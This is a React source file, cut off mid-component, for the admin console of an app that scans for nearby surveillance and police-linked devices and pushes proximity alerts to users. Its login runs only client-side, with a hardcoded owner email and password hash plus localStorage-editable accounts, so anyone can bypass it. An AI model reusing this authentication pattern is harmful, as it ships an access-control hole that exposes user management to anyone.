/**
 * Dev Console — accessed via /#dev
 * Protected by a 4-digit PIN stored in localStorage.
 * Normal users never see this; they use / with no hash.
 */
import React, { useState, useEffect, useRef, useCallback } from 'react'
import L from 'leaflet'
import 'leaflet/dist/leaflet.css'
import DeviceFilterPanel from './DeviceFilterPanel'
import MapView from './MapView'
import UpdateToast from './UpdateToast'

const SESSION_KEY     = 'sfm_dev_unlocked'
const LOCKOUT_KEY     = 'sfm_dev_lockout'
const DEV_ACCTS_KEY   = 'inv_dev_accounts_v1'
const DEV_OWNER_EMAIL = 'eckelbec1@gmail.com'
const DEV_OWNER_HASH  = '447d372d63651c5dc821a257dd80b3db3c13b35d8c26dc1e370f27164fc891e1'
const MAX_LOGIN_FAILS = 5
const LOCKOUT_MS      = 5 * 60 * 1000   // 5 minutes

// Returns all authorized dev console accounts: hardcoded owner + extra accounts from localStorage
function getDevAccounts() {
  const extra = JSON.parse(localStorage.getItem(DEV_ACCTS_KEY) || '[]')
  return [
    { email: DEV_OWNER_EMAIL, hash: DEV_OWNER_HASH, name: 'Owner', owner: true },
    ...extra,
  ]
}

function getLockout() {
  try { return JSON.parse(sessionStorage.getItem(LOCKOUT_KEY) || 'null') } catch { return null }
}
function setLockout(obj) { sessionStorage.setItem(LOCKOUT_KEY, JSON.stringify(obj)) }
function clearLockout()  { sessionStorage.removeItem(LOCKOUT_KEY) }

// ─────────────────────────────────────────────────────────────────────────────
// Login screen (username + password)
// ─────────────────────────────────────────────────────────────────────────────
function Passcode({ onUnlock }) {
  const [email,     setEmail]     = useState('')
  const [password,  setPassword]  = useState('')
  const [shake,     setShake]     = useState(false)
  const [err,       setErr]       = useState('')
  const [locked,    setLocked]    = useState(false)
  const [countdown, setCountdown] = useState(0)
  const [signing,   setSigning]   = useState(false)
  const passRef = useRef(null)

  useEffect(() => {
    const check = () => {
      const lo = getLockout()
      if (!lo) { setLocked(false); return }
      const remaining = Math.ceil((lo.until - Date.now()) / 1000)
      if (remaining <= 0) { clearLockout(); setLocked(false); setCountdown(0) }
      else { setLocked(true); setCountdown(remaining) }
    }
    check()
    const t = setInterval(check, 1000)
    return () => clearInterval(t)
  }, [])

  const attempt = async () => {
    if (locked || signing) return
    if (!email.trim() || !password) { setErr('Enter email and password'); return }
    setSigning(true)
    const hash = await sha256hex(password)
    const accounts = getDevAccounts()
    const match = accounts.find(a => a.email.toLowerCase() === email.trim().toLowerCase() && a.hash === hash)
    setSigning(false)
    if (match) {
      clearLockout()
      sessionStorage.setItem(SESSION_KEY, '1')
      onUnlock()
    } else {
      setShake(true)
      const lo = getLockout()
      const fails = (lo?.fails || 0) + 1
      if (fails >= MAX_LOGIN_FAILS) {
        setLockout({ until: Date.now() + LOCKOUT_MS, fails })
        setLocked(true)
        setErr(`Too many attempts — locked for ${LOCKOUT_MS / 60000} min`)
      } else {
        setLockout({ until: 0, fails })
        setErr(`Invalid credentials (${MAX_LOGIN_FAILS - fails} attempts left)`)
      }
      setPassword('')
      setTimeout(() => { setShake(false); setErr('') }, 2500)
    }
  }

  const onKey = e => { if (e.key === 'Enter') attempt() }

  const inp = {
    width:'100%', boxSizing:'border-box',
    background:'rgba(255,255,255,0.07)', border:'1px solid rgba(255,255,255,0.14)',
    borderRadius:10, color:'#fff', fontFamily:'inherit', fontSize:15,
    padding:'12px 14px', outline:'none',
    opacity: locked ? 0.35 : 1,
  }

  return (
    <div style={{
      position:'fixed', inset:0, background:'#080c14',
      display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center',
      fontFamily:'-apple-system,BlinkMacSystemFont,system-ui,sans-serif',
      backgroundImage:'linear-gradient(rgba(0,200,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.02) 1px,transparent 1px)',
      backgroundSize:'50px 50px',
    }}>
      <div style={{
        width:'100%', maxWidth:340, padding:'0 24px',
        animation: shake ? 'devShake 0.5s ease' : 'none',
      }}>
        {/* Logo */}
        <div style={{ textAlign:'center', marginBottom:36 }}>
          <div style={{ fontSize:11, letterSpacing:4, color:'rgba(0,200,255,0.5)', textTransform:'uppercase', marginBottom:10 }}>Invincible.Inc</div>
          <div style={{ fontSize:26, fontWeight:800, color:'#fff', letterSpacing:-0.5 }}>Dev Console</div>
          <div style={{ fontSize:12, color:'rgba(180,195,220,0.4)', marginTop:6 }}>Restricted access — authorized operators only</div>
        </div>

        {/* Status */}
        <div style={{ minHeight:24, textAlign:'center', marginBottom:16 }}>
          {locked
            ? <div style={{ fontSize:13, color:'#FF9F0A' }}>🔒 Locked — {countdown}s remaining</div>
            : err
              ? <div style={{ fontSize:13, color:'#FF453A' }}>{err}</div>
              : null
          }
        </div>

        {/* Fields */}
        <div style={{ display:'flex', flexDirection:'column', gap:10, marginBottom:16 }}>
          <input
            style={inp}
            type="email"
            autoComplete="email"
            placeholder="Email"
            value={email}
            disabled={locked}
            onChange={e => { setEmail(e.target.value); setErr('') }}
            onKeyDown={e => { if (e.key === 'Enter') passRef.current?.focus() }}
          />
          <input
            ref={passRef}
            style={inp}
            type="password"
            autoComplete="current-password"
            placeholder="Password"
            value={password}
            disabled={locked}
            onChange={e => { setPassword(e.target.value); setErr('') }}
            onKeyDown={onKey}
          />
        </div>

        <button
          onClick={attempt}
          disabled={locked || signing}
          style={{
            width:'100%', padding:'13px', borderRadius:12,
            border:'1px solid rgba(0,200,255,0.25)',
            background: (locked || signing) ? 'rgba(0,200,255,0.1)' : 'rgba(0,200,255,0.18)',
            color: (locked || signing) ? 'rgba(0,200,255,0.3)' : '#00c8ff',
            fontSize:14, fontWeight:700, fontFamily:'inherit',
            cursor: (locked || signing) ? 'not-allowed' : 'pointer',
            transition:'background 0.15s',
          }}
        >
          {locked ? `Locked (${countdown}s)` : signing ? '…' : 'Sign In'}
        </button>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Shared style helpers
// ─────────────────────────────────────────────────────────────────────────────
const C = {
  bg:'#080c14', panel:'#0d1322', card:'rgba(255,255,255,0.05)', card2:'rgba(255,255,255,0.09)',
  border:'rgba(255,255,255,0.08)', text:'#e8edf5', dim:'rgba(180,195,220,0.65)',
  dim2:'rgba(180,195,220,0.38)', accent:'#00c8ff', green:'#30D158',
  red:'#FF453A', orange:'#FF9F0A', purple:'#bf5af2',
  font:'-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif',
  gradA: 'linear-gradient(135deg,#00c8ff,#7c3aed)',
  gradG: 'linear-gradient(135deg,#30D158,#00c8ff)',
  gradO: 'linear-gradient(135deg,#FF9F0A,#FF453A)',
}

// Global keyframes injected once
if (typeof document !== 'undefined' && !document.getElementById('dev-keyframes')) {
  const s = document.createElement('style')
  s.id = 'dev-keyframes'
  s.textContent = `
    @keyframes devPulse{0%,100%{opacity:1}50%{opacity:0.4}}
    @keyframes devShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-12px)}40%{transform:translateX(12px)}60%{transform:translateX(-8px)}80%{transform:translateX(8px)}}
    @keyframes devFadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
    @keyframes devSpin{to{transform:rotate(360deg)}}
    .dev-card{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:14px 16px;transition:border-color 0.2s}
    .dev-card:hover{border-color:rgba(0,200,255,0.2)}
    .dev-stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:10px;margin-bottom:4px}
    .dev-stat{background:rgba(0,0,0,0.35);border-radius:10px;padding:10px 12px;border:1px solid rgba(255,255,255,0.06)}
    .dev-stat-num{font-size:22px;font-weight:700;line-height:1.1}
    .dev-stat-label{font-size:10px;color:rgba(180,195,220,0.5);text-transform:uppercase;letter-spacing:0.06em;margin-top:2px}
    .dev-row{display:flex;align-items:center;justify-content:space-between;padding:7px 0;border-bottom:1px solid rgba(255,255,255,0.06)}
    .dev-row:last-child{border-bottom:none;padding-bottom:0}
    .dev-badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:0.4px}
    .dev-section-nav{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
    .dev-section-btn{display:flex;align-items:center;gap:5px;padding:6px 12px;border-radius:20px;border:1px solid rgba(255,255,255,0.1);background:rgba(255,255,255,0.04);color:rgba(180,195,220,0.6);font-size:12px;font-weight:600;cursor:pointer;transition:all 0.15s;font-family:inherit}
    .dev-section-btn:hover{border-color:rgba(0,200,255,0.3);color:#00c8ff}
    .dev-section-btn.active{background:rgba(0,200,255,0.12);border-color:rgba(0,200,255,0.4);color:#00c8ff}
    .dev-table{width:100%;border-collapse:collapse;font-size:12px}
    .dev-table th{text-align:left;color:rgba(180,195,220,0.45);font-size:10px;text-transform:uppercase;letter-spacing:0.06em;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.07);font-weight:600}
    .dev-table td{padding:7px 8px;border-bottom:1px solid rgba(255,255,255,0.04);color:#e8edf5}
    .dev-table tr:last-child td{border-bottom:none}
    .dev-table tr:hover td{background:rgba(0,200,255,0.04)}
    .dev-terminal{background:#000;border:1px solid rgba(0,200,255,0.15);border-radius:10px;padding:12px 14px;font-family:"SF Mono","Fira Code",monospace;font-size:12px;color:#00c8ff}
    .dev-terminal .dim{color:rgba(0,200,255,0.4)}
    .dev-input{background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e8edf5;font-family:inherit;font-size:13px;padding:8px 11px;outline:none;width:100%;box-sizing:border-box;transition:border-color 0.15s}
    .dev-input:focus{border-color:rgba(0,200,255,0.4)}
    .dev-pill{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:100px;font-size:11px;font-weight:600}
    .live-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#30D158;animation:devPulse 2s infinite}
  `
  document.head.appendChild(s)
}

const S = {
  card:    { background:'rgba(255,255,255,0.05)', border:'1px solid rgba(255,255,255,0.08)', borderRadius:14, padding:'14px 16px' },
  label:   { fontSize:10, fontWeight:700, color:C.dim2, letterSpacing:'0.08em', textTransform:'uppercase', marginBottom:8, display:'flex', alignItems:'center', gap:6 },
  row:     { display:'flex', alignItems:'center', justifyContent:'space-between', padding:'7px 0', borderBottom:`1px solid ${C.border}` },
  rowLast: { display:'flex', alignItems:'center', justifyContent:'space-between', padding:'7px 0' },
  k:       { fontSize:13, color:C.dim },
  v:       { fontSize:13, color:C.text, fontWeight:500, fontFamily:'"SF Mono","Fira Code",monospace' },
  input:   { background:'rgba(255,255,255,0.07)', border:'1px solid rgba(255,255,255,0.1)', borderRadius:8, color:C.text, fontFamily:C.font, fontSize:13, padding:'8px 11px', outline:'none', width:'100%', boxSizing:'border-box' },
  select:  { background:'rgba(255,255,255,0.07)', border:'1px solid rgba(255,255,255,0.1)', borderRadius:8, color:C.text, fontFamily:C.font, fontSize:13, padding:'8px 11px', outline:'none', width:'100%', boxSizing:'border-box', appearance:'none', WebkitAppearance:'none' },
  btn: (col) => {
    col = col || C.accent
    const rgb = col===C.accent?'0,200,255':col===C.red?'255,69,58':col===C.green?'48,209,88':col===C.orange?'255,159,10':col===C.purple?'191,90,242':'150,150,150'
    return { background:`rgba(${rgb},0.13)`, border:`1px solid rgba(${rgb},0.25)`, borderRadius:10, color:col, fontFamily:C.font, fontSize:13, fontWeight:600, padding:'9px 16px', cursor:'pointer', transition:'all 0.15s', display:'inline-flex', alignItems:'center', gap:6 }
  },
  section: { display:'flex', flexDirection:'column', gap:12 },
  gradText: (grad) => ({ background:grad, WebkitBackgroundClip:'text', WebkitTextFillColor:'transparent', backgroundClip:'text' }),
}

function Val({ label, value, color }) {
  return (
    <div style={S.row}>
      <span style={S.k}>{label}</span>
      <span style={{ ...S.v, color: color || C.text }}>{value ?? '—'}</span>
    </div>
  )
}

function ValLast({ label, value, color }) {
  return (
    <div style={S.rowLast}>
      <span style={S.k}>{label}</span>
      <span style={{ ...S.v, color: color || C.text }}>{value ?? '—'}</span>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Dashboard tab
// ─────────────────────────────────────────────────────────────────────────────
function GpsSparkline({ history }) {
  if (!history || history.length === 0) {
    return <div style={{ color:C.dim2, fontSize:11, fontStyle:'italic' }}>Waiting for GPS samples…</div>
  }
  const W = 300, H = 48, barW = Math.max(2, Math.floor(W / history.length) - 1)
  const MAX_ACC = 100
  return (
    <svg width="100%" viewBox={`0 0 ${W} ${H}`} style={{ display:'block' }}>
      {history.map((s, i) => {
        const acc = Math.min(s.acc, MAX_ACC)
        const barH = Math.max(2, (acc / MAX_ACC) * H)
        const color = acc < 10 ? '#30D158' : acc < 30 ? '#FF9F0A' : '#FF453A'
        return (
          <rect key={i} x={i * (barW + 1)} y={H - barH} width={barW} height={barH} fill={color} opacity={0.8} />
        )
      })}
    </svg>
  )
}

function TabDashboard({ data }) {
  const { status, gps, users, encounters, heatCells, routePoints, health, gpsHistory } = data
  const w = encounters.filter(e => e.label==='Fun-Watcher').length
  const s = encounters.filter(e => e.label==='Fun-Stopper').length
  const m = encounters.filter(e => e.label!=='Fun-Watcher'&&e.label!=='Fun-Stopper').length
  const healthEntries = Object.entries(health)

  return (
    <div style={S.section}>
      <div style={S.label}>Scanner</div>
      <div style={S.card}>
        <Val label="Status" value={status?.running ? 'RUNNING' : 'IDLE'} color={status?.running ? C.green : C.dim} />
        <Val label="Mode" value={status?.mode?.toUpperCase()} />
        <ValLast label="Active users" value={users.length} />
      </div>

      <div style={S.label}>GPS</div>
      <div style={S.card}>
        <Val label="Source" value={gps?.source?.toUpperCase()} color={gps?.available ? C.green : C.red} />
        <Val label="Position" value={gps?.lat != null ? `${gps.lat.toFixed(5)}, ${gps.lon.toFixed(5)}` : 'No fix'} />
        <ValLast label="Age" value={gps?.age_s != null ? `${gps.age_s}s ago` : null} />
      </div>

      <div style={S.label}>Data</div>
      <div style={S.card}>
        <Val label="📷 Watchers" value={w} color={C.accent} />
        <Val label="🚔 Stoppers" value={s} color={C.red} />
        <Val label="📱 Misc" value={m} color={C.green} />
        <Val label="Heat cells" value={heatCells.length} />
        <ValLast label="Route points" value={routePoints.length} />
      </div>

      <div style={S.label}>GPS Accuracy (last {(gpsHistory||[]).length} samples · green &lt;10m · orange &lt;30m · red ≥30m)</div>
      <div style={S.card}>
        <GpsSparkline history={gpsHistory} />
        {gps?.accuracy != null && (
          <div style={{ fontSize:11, color:C.dim, marginTop:4 }}>
            Current: <span style={{ color: gps.accuracy < 10 ? C.green : gps.accuracy < 30 ? C.orange : C.red, fontFamily:'monospace' }}>
              {gps.accuracy.toFixed(1)} m
            </span>
          </div>
        )}
      </div>

      <div style={S.label}>API Health</div>
      <div style={S.card}>
        {healthEntries.length === 0
          ? <span style={{ color:C.dim, fontSize:13 }}>Checking…</span>
          : healthEntries.map(([ep, code], i) => {
            const Row = i < healthEntries.length-1 ? Val : ValLast
            return <Row key={ep} label={ep} value={code} color={code===200 ? C.green : C.red} />
          })
        }
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Scanner tab
// ─────────────────────────────────────────────────────────────────────────────
const DTYPE_EMOJI = {
  ring:'🔔', axon:'📹', flock:'📷', drone:'🚁', smartglasses:'🕶',
  phone:'📱', tablet:'📟', laptop:'💻', headphones:'🎧', speaker:'🔊',
  tv:'📺', streaming:'📡', gaming:'🎮', smartwatch:'⌚', smarthome:'🏠',
  car:'🚗', wifi_ap:'📶', unknown:'❓',
}

function TabScanner({ data, refresh }) {
  const { status, settings } = data
  const [busy, setBusy]         = useState(false)
  const [msg, setMsg]           = useState('')
  const [testing, setTesting]   = useState(false)
  const [testResults, setTestResults] = useState(null)
  const [recentDevices, setRecentDevices] = useState([])
  const [gpsStatus, setGpsStatus] = useState(null)

  // Poll live detections every 2 s
  useEffect(() => {
    const poll = async () => {
      try {
        const [dRes, gRes] = await Promise.all([
          fetch('/scan/recent?seconds=60').then(r => r.json()),
          fetch('/gps/status').then(r => r.json()),
        ])
        setRecentDevices(dRes.devices || [])
        setGpsStatus(gRes)
      } catch {}
    }
    poll()
    const id = setInterval(poll, 2000)
    return () => clearInterval(id)
  }, [])

  const control = async (action) => {
    setBusy(true); setMsg('')
    try {
      const r = await fetch(`/control/${action}`, { method:'POST' })
      const d = await r.json()
      setMsg(`${action} → mode: ${d.mode || '?'}`)
      refresh()
    } catch { setMsg('Request failed') }
    setBusy(false)
  }

  const setMode = async (mode) => {
    setBusy(true)
    await fetch('/settings', { method:'PUT', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ ...settings, scan_mode:mode }) }).catch(()=>{})
    setMsg(`Mode → ${mode}. Restart scanner to apply.`)
    refresh(); setBusy(false)
  }

  const runSelfTest = async () => {
    setTesting(true); setTestResults(null)
    try {
      const r = await fetch('/control/selftest', { method:'POST' })
      const d = await r.json()
      setTestResults(d.checks || [])
    } catch { setTestResults([{name:'Request', ok:false, detail:'Failed to reach backend'}]) }
    setTesting(false)
  }

  return (
    <div style={S.section}>
      <div style={S.label}>Status</div>
      <div style={S.card}>
        <Val label="Running" value={status?.running ? 'YES' : 'NO'} color={status?.running ? C.green : C.dim} />
        <ValLast label="Mode" value={status?.mode?.toUpperCase()} />
      </div>

      <div style={S.label}>Control</div>
      <div style={{ display:'flex', gap:10 }}>
        <button style={S.btn(C.green)} onClick={() => control('start')} disabled={busy}>▶ Start</button>
        <button style={S.btn(C.red)}   onClick={() => control('stop')}  disabled={busy}>⬛ Stop</button>
      </div>

      <div style={S.label}>Scan Mode</div>
      <div style={{ display:'flex', gap:8, flexWrap:'wrap' }}>
        {['idle','wifi','ble','both','fake'].map(m => (
          <button key={m} style={{
            ...S.btn(status?.mode===m ? C.accent : C.dim),
            background: status?.mode===m ? 'rgba(10,132,255,0.22)' : 'rgba(255,255,255,0.07)',
          }} onClick={() => setMode(m)}>{m.toUpperCase()}</button>
        ))}
      </div>

      {msg && <div style={{ fontSize:12, color:C.dim, fontFamily:'monospace' }}>{msg}</div>}

      <div style={S.label}>Current Settings</div>
      <div style={S.card}>
        <Val label="Wi-Fi scan" value={settings?.wifi_scan_enabled ? 'ON' : 'OFF'} color={settings?.wifi_scan_enabled ? C.green : C.red} />
        <Val label="BLE scan"   value={settings?.ble_scan_enabled  ? 'ON' : 'OFF'} color={settings?.ble_scan_enabled  ? C.green : C.red} />
        <Val label="Interval"   value={settings?.wifi_scan_interval_s != null ? `${settings.wifi_scan_interval_s}s` : null} />
        <Val label="RSSI floor" value={settings?.rssi_floor != null ? `${settings.rssi_floor} dBm` : null} />
        <ValLast label="Heat cell" value={settings?.heat_cell_m != null ? `${settings.heat_cell_m}m` : null} />
      </div>

      <div style={S.label}>Self-Test</div>
      <div style={{ display:'flex', gap:8, alignItems:'center' }}>
        <button style={S.btn(C.accent)} onClick={runSelfTest} disabled={testing}>
          {testing ? '⏳ Testing…' : '▶ Run Self-Test'}
        </button>
      </div>
      {testResults && (
        <div style={S.card}>
          {testResults.map((c, i) => (
            <div key={i} style={i < testResults.length-1 ? S.row : S.rowLast}>
              <span style={{ fontSize:13, color:c.ok ? C.green : C.red }}>
                {c.ok ? '✅' : '❌'} {c.name}
              </span>
              <span style={{ fontSize:11, color:C.dim, fontFamily:'monospace', maxWidth:'55%', textAlign:'right', wordBreak:'break-all' }}>
                {c.detail}
              </span>
            </div>
          ))}
        </div>
      )}

      {/* GPS status warning */}
      <div style={S.label}>GPS Status</div>
      <div style={{ ...S.card, borderColor: gpsStatus?.available ? '#1e2d3d' : '#ff453a44' }}>
        {gpsStatus?.available ? (
          <>
            <Val label="Source" value={gpsStatus.source?.toUpperCase()} color={C.green} />
            <Val label="Age" value={gpsStatus.age_s != null ? `${gpsStatus.age_s}s` : '—'} />
            <ValLast label="Position" value={gpsStatus.lat != null ? `${gpsStatus.lat?.toFixed(4)}, ${gpsStatus.lon?.toFixed(4)}` : '—'} />
          </>
        ) : (
          <div style={{ fontSize:12, color:'#ff453a', lineHeight:1.6 }}>
            ⚠ No GPS fix — devices will be detected but won't appear on the map.<br/>
            <span style={{ color:C.dim, fontSize:11 }}>
              Open the app in your browser and allow location access, or connect a phone.
            </span>
          </div>
        )}
      </div>

      {/* Live detections feed */}
      <div style={S.label}>
        Live Detections — last 60 s ({recentDevices.length} devices)
      </div>
      {recentDevices.length === 0 ? (
        <div style={{ ...S.card, color:C.dim, fontSize:12 }}>
          No devices detected yet. Scanner must be running.
        </div>
      ) : (
        <div style={{ ...S.card, padding:0, overflow:'hidden' }}>
          {recentDevices.slice(0, 30).map((d, i) => {
            const isSpecial = ['ring','axon','flock','drone','smartglasses'].includes(d.device_type)
            const emoji = DTYPE_EMOJI[d.device_type] || '❓'
            const ago = Math.round((Date.now() - d.last_seen_ms) / 1000)
            return (
              <div key={d.target_key} style={{
                display:'flex', alignItems:'center', gap:10,
                padding:'8px 12px',
                borderBottom: i < Math.min(recentDevices.length, 30) - 1 ? '1px solid #1a2533' : 'none',
                background: isSpecial ? 'rgba(0,230,118,0.06)' : 'transparent',
              }}>
                <span style={{ fontSize:16, flexShrink:0 }}>{emoji}</span>
                <div style={{ flex:1, minWidth:0 }}>
                  <div style={{ fontSize:12, color: isSpecial ? '#00e676' : C.text, fontWeight: isSpecial ? 700 : 400, overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                    {d.label || d.name || d.device_type || 'Unknown'}
                    {isSpecial && <span style={{ fontSize:10, color:'#00e676', marginLeft:6 }}>★ TARGET</span>}
                  </div>
                  <div style={{ fontSize:10, color:C.dim }}>
                    {d.source?.toUpperCase()} · {d.rssi_max?.toFixed(0)} dBm · {d.hit_count} hits
                  </div>
                </div>
                <div style={{ fontSize:10, color:C.dim, flexShrink:0 }}>{ago}s ago</div>
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// Users tab
// ─────────────────────────────────────────────────────────────────────────────
function TabUsers({ data, refresh }) {
  const { users: activeUsers, registeredUsers } = data
  const [type, setType]   = useState('Fun-Stopper')
  const [dist, setDist]   = useState(50)
  const [rssi, setRssi]   = useState(-65)
  const [sent, setSent]   = useState({})
  const [busy, setBusy]   = useState({})
  const [confirmDel, setConfirmDel] = useState(null) // device_id awaiting confirm

  // Index maps
  const activeByName = {}
  ;(activeUsers || []).forEach(u => { activeByName[u.username] = u })
  const regByName = {}
  ;(registeredUsers || []).forEach(u => { if (u.username) regByName[u.username] = u })

  // Merge: all registered users first, then any active-only (no DB entry yet)
  // Sort alphabetically by username so the list never shuffles on refresh.
  const allUsers = [...(registeredUsers || [])]
  ;(activeUsers || []).forEach(u => {
    if (u.username && !regByName[u.username]) allUsers.push({ ...u, _activeOnly: true })
  })
  allUsers.sort((a, b) => (a.username || '').localeCompare(b.username || ''))
  const onlineUsers = allUsers.filter(u => u.username && activeByName[u.username])

  // ── Helpers ──────────────────────────────────────────────────────────────
  const sendTo = async (username) => {
    await fetch('/users/alert', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ target: username, type, color: type === 'Fun-Stopper' ? 'red' : 'blue', distance: dist, rssi }),
    }).catch(() => {})
    setSent(p => ({ ...p, [username]: true }))
    setTimeout(() => setSent(p => { const n = { ...p }; delete n[username]; return n }), 2000)
  }

  const sendAll = () => Promise.all(onlineUsers.map(u => sendTo(u.username)))

  // Auto-registers device if active-only, then applies the flag toggle
  const toggle = async (u, field, currentVal) => {
    const devId = u.device_id || activeByName[u.username]?.device_id
    if (!devId) return
    const key = `${devId}_${field}`
    setBusy(p => ({ ...p, [key]: true }))
    // If not yet in DB, create a registry entry first
    if (u._activeOnly) {
      await fetch('/users/register', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ device_id: devId, username: u.username, vehicle: u.vehicle || 'motorcycle' }),
      }).catch(() => {})
    }
    await fetch(`/users/registry/${encodeURIComponent(devId)}`, {
      method: 'PUT', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ [field]: currentVal ? 0 : 1 }),
    }).catch(() => {})
    await refresh()
    setBusy(p => { const n = { ...p }; delete n[key]; return n })
  }

  const reprompt = async (devId) => {
    await fetch('/users/registry/reprompt', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ device_id: devId }),
    }).catch(() => {})
  }

  const repromptAll = async () => {
    await fetch('/users/registry/reprompt-all', { method: 'POST' }).catch(() => {})
  }

  const deleteUser = async (devId) => {
    await fetch(`/users/registry/${encodeURIComponent(devId)}`, { method: 'DELETE' }).catch(() => {})
    setConfirmDel(null)
    refresh()
  }

  const VisToggle = ({ on, label, onClick, disabled }) => (
    <button onClick={onClick} disabled={disabled} style={{
      background: on ? 'rgba(48,209,88,0.13)' : 'rgba(255,69,58,0.10)',
      border: `1px solid ${on ? C.green : C.red}`,
      borderRadius: 7, color: on ? C.green : C.red,
      fontFamily: C.font, fontSize: 11, fontWeight: 600,
      padding: '4px 9px', cursor: disabled ? 'not-allowed' : 'pointer',
      opacity: disabled ? 0.5 : 1, whiteSpace: 'nowrap',
    }}>
      {label} {on ? 'ON' : 'OFF'}
    </button>
  )

  return (
    <div style={S.section}>

      {/* ── Alert config ── */}
      <div style={S.label}>Alert Config</div>
      <div style={S.card}>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
          <div>
            <div style={{ ...S.label, marginBottom: 4 }}>Type</div>
            <select style={S.select} value={type} onChange={e => setType(e.target.value)}>
              <option>Fun-Stopper</option><option>Fun-Watcher</option><option>Target</option>
            </select>
          </div>
          <div>
            <div style={{ ...S.label, marginBottom: 4 }}>Distance (m)</div>
            <input style={S.input} type="number" value={dist} onChange={e => setDist(Number(e.target.value))} />
          </div>
          <div>
            <div style={{ ...S.label, marginBottom: 4 }}>RSSI (dBm)</div>
            <input style={S.input} type="number" value={rssi} onChange={e => setRssi(Number(e.target.value))} />
          </div>
        </div>
        <button style={{ ...S.btn(C.red), marginTop: 10 }} onClick={sendAll} disabled={onlineUsers.length === 0}>
          📡 Broadcast to Online ({onlineUsers.length})
        </button>
      </div>

      {/* ── User list header + bulk action ── */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={S.label}>
          All Users ({allUsers.length})
          <span style={{ color: C.dim, fontWeight: 400, marginLeft: 8 }}>
            · {onlineUsers.length} online now
          </span>
        </div>
        <button
          style={{ ...S.btn(C.orange), padding: '5px 12px', fontSize: 11 }}
          onClick={repromptAll}
          title="Force all users to re-show the sign-in screen on their next check-in">
          ↺ Re-prompt All
        </button>
      </div>

      {allUsers.length === 0 && (
        <div style={{ ...S.card, color: C.dim, fontSize: 13 }}>
          No users yet — they will appear here once someone opens the app.
        </div>
      )}

      {allUsers.map(u => {
        const live       = activeByName[u.username]
        const isOnline   = !!live
        const devId      = u.device_id || live?.device_id || null
        const activeOnly = !!u._activeOnly

        const visOn      = activeOnly ? true : u.visible_to_others !== 0
        const canSee     = activeOnly ? true : u.can_view_others   !== 0
        const canContrib = activeOnly ? true : u.can_contribute    !== 0

        const statusColor = activeOnly ? C.accent
          : u.status === 'approved' ? C.green
          : u.status === 'blocked'  ? C.red
          : C.orange
        const statusLabel = activeOnly ? 'unregistered' : u.status

        return (
          <div key={devId || u.username} style={{
            ...S.card,
            opacity: (!activeOnly && u.status === 'blocked') ? 0.5 : 1,
            border: `1px solid ${isOnline ? 'rgba(0,212,255,0.25)' : C.border}`,
          }}>

            {/* ── Row 1: name + status badges + action buttons ── */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{
                  width: 8, height: 8, borderRadius: '50%', flexShrink: 0, display: 'inline-block',
                  background: isOnline ? C.green : C.dim,
                  boxShadow: isOnline ? `0 0 6px ${C.green}` : 'none',
                }} />
                <span style={{ color: u.username ? C.text : C.dim, fontWeight: 700, fontSize: 15 }}>
                  {u.username || '(no name)'}
                </span>
                <span style={{ fontSize: 11, color: C.dim }}>{u.vehicle}</span>
              </div>
              <div style={{ display: 'flex', gap: 5, alignItems: 'center', flexWrap: 'wrap', justifyContent: 'flex-end' }}>
                <span style={{ fontSize: 10, fontWeight: 700, textTransform: 'uppercase', color: statusColor }}>
                  {statusLabel}
                </span>
                {/* Approve button for pending users */}
                {!activeOnly && u.status === 'pending' && devId && (
                  <button style={{ ...S.btn(C.green), padding: '3px 9px', fontSize: 11 }}
                    onClick={async () => {
                      await fetch('/users/registry/approve', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ device_id: devId }) })
                      refresh()
                    }}>✓ Approve</button>
                )}
                {/* Alert button if online */}
                {isOnline && (
                  <button style={{ ...S.btn(sent[u.username] ? C.green : C.red), padding: '3px 9px', fontSize: 11 }}
                    onClick={() => sendTo(u.username)}>
                    {sent[u.username] ? '✓ Sent' : '🚔 Alert'}
                  </button>
                )}
                {/* Re-prompt button */}
                {devId && (
                  <button style={{ ...S.btn(C.orange), padding: '3px 9px', fontSize: 11 }}
                    title="Force this device to re-show the sign-in screen"
                    onClick={() => reprompt(devId)}>
                    ↺ Re-prompt
                  </button>
                )}
                {/* Delete button */}
                {devId && (
                  confirmDel === devId
                    ? <><button style={{ ...S.btn(C.red), padding: '3px 9px', fontSize: 11 }} onClick={() => deleteUser(devId)}>Confirm Delete</button>
                        <button style={{ ...S.btn(C.dim), padding: '3px 9px', fontSize: 11 }} onClick={() => setConfirmDel(null)}>Cancel</button></>
                    : <button style={{ ...S.btn(C.dim), padding: '3px 9px', fontSize: 11 }} onClick={() => setConfirmDel(devId)}>✕ Delete</button>
                )}
              </div>
            </div>

